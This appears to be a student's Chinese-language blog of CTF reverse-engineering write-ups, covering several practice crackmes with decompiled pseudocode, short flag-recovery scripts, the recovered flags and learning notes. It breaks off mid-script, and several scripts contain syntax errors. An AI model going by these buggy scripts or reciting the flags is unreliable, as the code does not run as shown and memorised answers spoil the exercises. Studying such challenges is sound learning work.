<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">v4 = [<span class="number">42</span>,<span class="number">70</span>,<span class="number">39</span>,<span class="number">34</span>,<span class="number">78</span>,<span class="number">44</span>,<span class="number">34</span>,<span class="number">40</span>,<span class="number">73</span>,<span class="number">63</span>,<span class="number">43</span>,<span class="number">64</span>]</span><br><span class="line">    </span><br><span class="line"><span class="comment">//\#r：防特殊字符转</span></span><br><span class="line">str = r<span class="number">&#x27;</span>~&#125;|&#123;zyxwvutsrqponmlkjihgfedcba`_^]\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?&gt;=&lt;;:<span class="number">9876543210</span>/.-,+*)(<span class="string">&#x27;+chr(0x27)+r&#x27;</span>&amp;%$# !<span class="string">&quot;&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">s=[]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">flag1 = &#x27;&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">for i in v4:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  print(i)//循环输入V4的值</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  s.append(str.find(chr(i))+1)//将V4【i】转为字符并且在str寻找并且将其位置下标加一返回到s数组中，</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">for i in s:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  flag1 += chr(i)//设置循环将s数组中的值由十进制转为字符</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">print(flag1)C</span></span><br></pre></td></tr></table></figure>



<p>flag{U9X_1S_W6@T?}</p>
<p><strong>收获：</strong></p>
<p>了解的用UPX脱壳</p>
<p>str.find函数为在str中寻找 </p>
<p>chr（）将十进制转为字符</p>
<p>s.append()将括号里的值转为10进制并且复制给s</p>
<h2 id="ACTF新生赛2020-rome"><a href="#ACTF新生赛2020-rome" class="headerlink" title="[ACTF新生赛2020]rome"></a>[ACTF新生赛2020]rome</h2><p>首先，无壳。F5打开，找到 代码部分。</p>
<p>然后代码分析：</p>
<p>找到关键<code> strcpy(v12, &quot;Qsw3sj_lz4_Ujw@l&quot;);</code>然后主要是在下面的循环中找所需要的。就是比较进行输出。</p>
<p><strong>脚本分析：</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">a=[<span class="number">81</span>, <span class="number">115</span>, <span class="number">119</span>, <span class="number">51</span>, <span class="number">115</span>, <span class="number">106</span>, <span class="number">95</span>, <span class="number">108</span>, <span class="number">122</span>, <span class="number">52</span>, <span class="number">95</span>, <span class="number">85</span>, <span class="number">106</span>, <span class="number">119</span>, <span class="number">64</span>, <span class="number">108</span>]</span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="string">//将上面的字符串转为ASCLL码值</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">for i in range (0, 16):</span></span><br><span class="line"><span class="string">   for k  in range(0,127)://ASCLL码值的范围为 0~126</span></span><br><span class="line"><span class="string">       z=k</span></span><br><span class="line"><span class="string">       if k&gt;64 and k&lt;=90:</span></span><br><span class="line"><span class="string">         k=(k-51)%26+65//要注意这里用了凯撒加密将50换为51</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">       if k&gt;96 and k&lt;=122:</span></span><br><span class="line"><span class="string">         k=(k-79)%26+97</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">       if k==a[i]://最后进行比较，然后输出</span></span><br><span class="line"><span class="string">         flag+=chr(z)</span></span><br><span class="line"><span class="string">       </span></span><br><span class="line"><span class="string">print(flag)</span></span><br></pre></td></tr></table></figure>

<p>flag{Cae3ar_th4_Gre@t}</p>
<p><strong>收获：</strong></p>
<p>strcpy函数：函数的复制。</p>
<p>ASCLL码值的范围为 0~126</p>
<p>知道了 凯撒加密</p>
<p>该方法把一条消息中的每个字母用字母表中固定距离之后的那个字母来替代。（如果越过了字母Z，会绕回到字母表的起始位置。例如，如果每个字母都用字母表中两个位置之后的字母代替，那么Y就被替换为A，Z就被替换为B。）编写程序用凯撒加密方法对消息进行加密。用户输入待加密的消息和移位计数（字母移动的位置数目，取值为1-25）：</p>
<h2 id="BJDCTF2020-JustRE"><a href="#BJDCTF2020-JustRE" class="headerlink" title="[BJDCTF2020]JustRE"></a>[BJDCTF2020]JustRE</h2><p>无壳，拖进ida32，F5查看main函数，</p>
<p>在main函数中，找不到有用的的值，所以上网查了一下用shift+F12查看字符串</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031443780.png" alt="image-20231114204517671"></p>
<p>观察到类似的flag点进去查看：</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031443742.png" alt="image-20231114204859674"></p>
<p>点击DialogFunc+5A↑o之后按F5查看伪代码，</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> <span class="built_in">sprintf</span>(String, <span class="string">&quot; BJD&#123;%d%d2069a45792d233ac&#125;&quot;</span>, <span class="number">19999</span>, <span class="number">0</span>);</span><br><span class="line">        SetWindowTextA(hWnd, String);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="comment">////根据C语言的推测，两个%d%d分别对应19999和0</span></span><br><span class="line"><span class="comment">////所以整理一下&#123;1999902069a45792d233ac&#125;</span></span><br></pre></td></tr></table></figure>



<p>flag{1999902069a45792d233ac}</p>
<p><strong>收获：</strong></p>
<p>当无从下手的时候可以shift+F12查看一下字符串，或许会有一定的收获</p>
<p>flag不一定在main函数中。</p>
<h2 id="Java逆向解密"><a href="#Java逆向解密" class="headerlink" title="Java逆向解密"></a>Java逆向解密</h2><p>2023.10.15</p>
<p>解压完之后发现文件后缀为.class可以判断为java文件。</p>
<p>用 jadx打开，找到main函数</p>
<p>找到几个关键的代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">char</span> c : arr) &#123;</span><br><span class="line"><span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> (c + <span class="string">&#x27;@&#x27;</span>) ^ <span class="number">32</span>; <span class="comment">//加密过程                                                                                                                          </span></span><br><span class="line">Resultlist.add(Integer.valueOf(result));<span class="comment">//把result以整形返回,再添加到Resultlist里</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//该代码的意思是把输入的字符每一个都加上@的ascii码，再与32做异或，最后添加到resultlist里。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span>[] KEY = &#123;<span class="number">180</span>, <span class="number">136</span>, <span class="number">137</span>, <span class="number">147</span>, <span class="number">191</span>, <span class="number">137</span>, <span class="number">147</span>, <span class="number">191</span>, <span class="number">148</span>, <span class="number">136</span>, <span class="number">133</span>, <span class="number">191</span>, <span class="number">134</span>, <span class="number">140</span>, <span class="number">129</span>, <span class="number">135</span>, <span class="number">191</span>, <span class="number">65</span>&#125;;<span class="keyword">if</span> (Resultlist.equals(KEYList)) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Congratulations！&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            System.err.println(<span class="string">&quot;Error！&quot;</span>);</span><br><span class="line"><span class="comment">//再由此处代码判断resultlist与keylist是否相等</span></span><br><span class="line"></span><br><span class="line">equal 相等的</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<p><strong>脚本分析：</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">key=[<span class="number">180</span>, <span class="number">136</span>, <span class="number">137</span>, <span class="number">147</span>, <span class="number">191</span>, <span class="number">137</span>, <span class="number">147</span>, <span class="number">191</span>, <span class="number">148</span>, <span class="number">136</span>, <span class="number">133</span>, <span class="number">191</span>, <span class="number">134</span>, <span class="number">140</span>, <span class="number">129</span>, <span class="number">135</span>, <span class="number">191</span>, <span class="number">65</span>]</span><br><span class="line">result =[]</span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(key)):  <span class="comment">#求key的长度</span></span><br><span class="line">    key[i] =key[i]-<span class="built_in">ord</span>(<span class="string">&quot;@&quot;</span>)^<span class="number">32</span><span class="comment">#将key加密</span></span><br><span class="line">    result.append(key[i])<span class="comment">#将结果复制给key[i]</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(result)):</span><br><span class="line">    flag +=<span class="built_in">chr</span>(result[i])<span class="comment">#flag=把result[i]由ASCLL码值转为字符</span></span><br><span class="line">    </span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;flag&#123;&quot;</span>+flag+<span class="string">&quot;&#125;&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>flag{ This_is_the_flag_!}</p>
<p><strong>收获：</strong></p>
<p>用异或将flag进行加密比较得出结果</p>
<p>注意{}和[]的区别，前者无序后者有序</p>
<p>python十分注重缩进，如果缩进不正确，得到的结果大不相同。</p>
<h2 id="GXYCTF2019-luck-guy"><a href="#GXYCTF2019-luck-guy" class="headerlink" title="[GXYCTF2019]luck_guy"></a>[GXYCTF2019]luck_guy</h2><p>2023.11.16</p>
<p>拖进IDA,找到main函数中的求flag的地方</p>
<p>可以看出所求就在这个循环里，但是 <code>switch ( rand() % 200 )</code>的意思是随机抽取模为200</p>
<p>所以确定 一些逻辑:4-5-1</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">switch</span> ( rand() % <span class="number">200</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;OK, it&#x27;s flag:&quot;</span>);</span><br><span class="line">        <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x28</span>uLL);<span class="comment">//初始化</span></span><br><span class="line">        <span class="built_in">strcat</span>((<span class="type">char</span> *)&amp;s, f1);<span class="comment">//将f1加在s后面,双击点击查看f1=&#x27;GXY&#123;do_not_&#x27;</span></span><br><span class="line">        <span class="built_in">strcat</span>((<span class="type">char</span> *)&amp;s, &amp;f2);<span class="comment">//将f2加在s后面，f2=&#x27;icug`of\x7F&#x27;</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)&amp;s);<span class="comment">//输出的s=f1+f2</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Solar not like you&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Solar want a girlfriend&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        s = <span class="number">0x7F666F6067756369</span>LL;<span class="comment">//转为字符为&#x27;\x7Ffo`guci&#x27;，但是ELF文件通常使用小端序存储，IDA会把内存中的数据自动转化为大端序存储，所以此处s要反过来//有的直接给你转为字符串是正常的</span></span><br><span class="line">        v5 = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">strcat</span>(&amp;f2, (<span class="type">const</span> <span class="type">char</span> *)&amp;s);<span class="comment">//将s的值加在f2后面，因为f2为空，所以f2=s</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">7</span>; ++j )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( j % <span class="number">2</span> == <span class="number">1</span> )<span class="comment">//当余数为一时，f2[j]=f2[j]-2</span></span><br><span class="line">            *(&amp;f2 + j) -= <span class="number">2</span>;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            --*(&amp;f2 + j);<span class="comment">//否则f2[j]=f2[j]-1</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;emmm,you can&#x27;t find flag 23333&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>





<p><strong>脚本分析：</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">f1=<span class="string">&quot;&#123;do_not_&quot;</span>     <span class="comment">#&quot;GXY&#123;do_not_&quot;</span></span><br><span class="line">f2= <span class="string">&quot;icug`of\x7F&quot;</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">8</span>):</span><br><span class="line">    <span class="keyword">if</span> j%<span class="number">2</span>==<span class="number">1</span>:</span><br><span class="line">       f2=f2[:j]+<span class="built_in">chr</span>(<span class="built_in">ord</span>(f2[j])-<span class="number">2</span>) +f2[j+<span class="number">1</span>:] <span class="comment">#C语言：f2[j]=f2[j]-2;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">       f2=f2[:j]+<span class="built_in">chr</span>(<span class="built_in">ord</span>(f2[j])-<span class="number">1</span>) +f2[j+<span class="number">1</span>:]<span class="comment">#C语言：f2[j]=f2[j]-1;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;flag&quot;</span>+f1+f2)</span><br></pre></td></tr></table></figure>



<p>flag{do_not_hate_me}</p>
<p><strong>收获：</strong></p>
<p><code>strcat</code>函数：追加函数，strcat函数是字符串追加函数，也就是在字符串后面追加另一个字符串。（在记一遍）</p>
<p><code>memset</code>函数一般用于初始化，例如<code>memset(&amp;s, 0, 40uLL)</code>的作用是将起始地址为s的内存块的前40个字节的内容都设置为0。这种操作常用于初始化内存块，清空数组或结构体等。</p>
<p>小段储存和大段储存：LF文件通常使用小端序存储，IDA会把内存中的数据自动转化为大端序存储，所以要注意区分</p>
<p><strong>注意：<code>\x7F</code>为16进制，所以它们是一块的。</strong></p>
<h2 id="刮开有奖"><a href="#刮开有奖" class="headerlink" title="刮开有奖"></a>刮开有奖</h2><p>2023.11.18</p>
<p>​     没壳，32位打开，找到main函数。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">  </span><br><span class="line"> <span class="keyword">if</span> ( <span class="built_in">strlen</span>(String) == <span class="number">8</span> )<span class="comment">//可以判断我们所求为8位数。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">sub_4010F0</span>(v7, <span class="number">0</span>, <span class="number">10</span>);<span class="comment">//找到关键函数</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//里面是一个对于V7的逆向。</span></span><br><span class="line"><span class="comment">//要注意的是:a1+4*i，也就是a1【i】，a1+4 * result，也就是a1【result】</span></span><br><span class="line"><span class="comment">//然后将其还原为C语言</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>  得到的V7的值为”3JSJSSaZEnn”</p>
<p>通过用查看字符串,可以发现V4和V5为base64加密</p>
<p>通过在线解密可以发现<code>BCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=</code></p>
<p>看到了熟悉的base64加密的特征</p>
<p>结合上面v4和v5的定义以及最后if对v4和v5的比较，我们可以得知v4,v5定义的过程是一个base64加密的过程。通过在线base64解密：BASE64加密解密，我们可以得到加密前的v4和v5</p>
<p>现在我们知道了 :</p>
<p>V7&#x3D;”3CEHJNSZagn”</p>
<p>v4 &#x3D; “jMp”</p>
<p>v5 &#x3D; “WP1”</p>
<p>现在我们可以最后一段代码了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">if</span> ( String[<span class="number">0</span>] == v7[<span class="number">0</span>] + <span class="number">34</span><span class="comment">//v70[0]为3将其转为ASCLL码加34在转换为字符则为String的第一个值 </span></span><br><span class="line">        &amp;&amp; String[<span class="number">1</span>] == v10<span class="comment">//v10为第五个位置,所以查看第五个位置的值</span></span><br><span class="line">        &amp;&amp; <span class="number">4</span> * String[<span class="number">2</span>] - <span class="number">141</span> == <span class="number">3</span> * v8</span><br><span class="line">     <span class="comment">//恒等公式变换一下：String[2]=(3*v8+141)/4得到string的值</span></span><br><span class="line">        &amp;&amp; String[<span class="number">3</span>] / <span class="number">4</span> == <span class="number">2</span> * (v13 / <span class="number">9</span>)<span class="comment">//string[3]同理求出为P</span></span><br><span class="line">        &amp;&amp; !<span class="built_in">strcmp</span>(v4, <span class="string">&quot;ak1w&quot;</span>)</span><br><span class="line">        &amp;&amp; !<span class="built_in">strcmp</span>(v5, <span class="string">&quot;V1Ax&quot;</span>) )</span><br><span class="line">&#123;</span><br><span class="line">        MessageBoxA(hDlg, <span class="string">&quot;U g3t 1T!&quot;</span>, <span class="string">&quot;@_@&quot;</span>, <span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//v7原:&quot;ZJSECaNH3ng&quot;</span></span><br></pre></td></tr></table></figure>



<p>所以得到第一个值为:U</p>
<p>第二个值为:J</p>
<p>第三和第四为：WP</p>
<p>所以猜测后面的为base64解密的几个值</p>
<p>故：</p>
<p>flag{UJWP1iMP}</p>
<p><strong>收获 ：</strong></p>
<p>数组寻址公式：</p>
<h2 id="简单注册器"><a href="#简单注册器" class="headerlink" title="简单注册器"></a>简单注册器</h2><p>2023.11.20</p>
<h3 id="第一次遇见-apk后缀的文件，工具为jadx。"><a href="#第一次遇见-apk后缀的文件，工具为jadx。" class="headerlink" title="第一次遇见.apk后缀的文件，工具为jadx。"></a>第一次遇见.apk后缀的文件，工具为jadx。</h3><p>打开找到main函数</p>
<p>分析一下就可以看到所需的。</p>
<p>然后编写脚本。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">x = [<span class="number">100</span>, <span class="number">100</span>, <span class="number">50</span>, <span class="number">57</span>, <span class="number">52</span>, <span class="number">48</span>, <span class="number">99</span>, <span class="number">48</span>, <span class="number">52</span>, <span class="number">52</span>, <span class="number">54</span>, <span class="number">50</span>, <span class="number">98</span>, <span class="number">52</span>, <span class="number">100</span>, <span class="number">100</span>, <span class="number">55</span>, <span class="number">99</span>, <span class="number">52</span>, <span class="number">53</span>, <span class="number">48</span>, <span class="number">53</span>, <span class="number">50</span>, <span class="number">56</span>, <span class="number">56</span>, <span class="number">51</span>, <span class="number">53</span>, <span class="number">99</span>, <span class="number">99</span>, <span class="number">97</span>, <span class="number">49</span>, <span class="number">53</span>]</span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line">x[<span class="number">2</span>] = (x[<span class="number">2</span>] + x[<span class="number">3</span>]) - <span class="number">50</span></span><br><span class="line">x[<span class="number">4</span>] = (x[<span class="number">2</span>] + x[<span class="number">5</span>]) - <span class="number">48</span></span><br><span class="line">x[<span class="number">30</span>] = (x[<span class="number">31</span>] + x[<span class="number">9</span>]) - <span class="number">48</span></span><br><span class="line">x[<span class="number">14</span>] = (x[<span class="number">27</span>] + x[<span class="number">28</span>]) - <span class="number">97</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    a = x[<span class="number">31</span> - i]</span><br><span class="line">    x[<span class="number">31</span> - i] = x[i]</span><br><span class="line">    x[i] = a</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> x:</span><br><span class="line">    flag += <span class="built_in">chr</span>(num)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p><strong>收获 ：</strong></p>
<p>第一次遇见.apk后缀的文件，工具为jadx。</p>
<p>比较简单。</p>
<h2 id="GWCTF-2019-pyre"><a href="#GWCTF-2019-pyre" class="headerlink" title="[GWCTF 2019]pyre"></a>[GWCTF 2019]pyre</h2><p>2023.11.20</p>
<p>得到的是 .pyc 文件，需要转换成 .py 文件</p>
<p>可以通过在线网站转换</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">l = <span class="built_in">len</span>(input1)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l):</span><br><span class="line">    num = ((input1[i] + i) % <span class="number">128</span> + <span class="number">128</span>) % <span class="number">128</span></span><br><span class="line">    code += num</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l - <span class="number">1</span>):</span><br><span class="line">    code[i] = code[i] ^ code[(i + <span class="number">1</span>)]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> code</span><br><span class="line">code = [<span class="string">&#x27;\x1f&#x27;</span>, <span class="string">&#x27;\x12&#x27;</span>, <span class="string">&#x27;\x1d&#x27;</span>, <span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;\x01&#x27;</span>, <span class="string">&#x27;\x06&#x27;</span>, <span class="string">&#x27;\x14&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27;\x1b&#x27;</span>, <span class="string">&#x27;U&#x27;</span>, <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;\x01&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;;&#x27;</span>, <span class="string">&#x27;%&#x27;</span>, <span class="string">&#x27;\x13&#x27;</span>]</span><br><span class="line"></span><br><span class="line">[<span class="string">&#x27;G&#x27;</span>, <span class="string">&#x27;W&#x27;</span>, <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;J&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;!&#x27;</span>, <span class="string">&#x27;&#125;&#x27;</span>]</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>通过代码分析这是一个对 一段字符的 异或，所以我们要做的是把它逆向回去就可以了。</p>
<p><strong>脚本分析：</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">code = [<span class="string">&#x27;\x1f&#x27;</span>, <span class="string">&#x27;\x12&#x27;</span>, <span class="string">&#x27;\x1d&#x27;</span>, <span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;\x01&#x27;</span>, <span class="string">&#x27;\x06&#x27;</span>, <span class="string">&#x27;\x14&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27;\x1b&#x27;</span>, <span class="string">&#x27;U&#x27;</span>, <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;\x01&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;;&#x27;</span>, <span class="string">&#x27;%&#x27;</span>, <span class="string">&#x27;\x13&#x27;</span>]</span><br><span class="line"><span class="built_in">str</span>=<span class="string">&quot; &quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(code-<span class="number">2</span>),-<span class="number">1</span>,-<span class="number">1</span>)</span><br><span class="line">       code[i]=<span class="built_in">chr</span>(<span class="built_in">ord</span>(code[i])^<span class="built_in">ord</span>(code[i+<span class="number">1</span>]))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span>  <span class="built_in">range</span> (<span class="built_in">len</span>(code))</span><br><span class="line">       num  = <span class="built_in">chr</span>(((<span 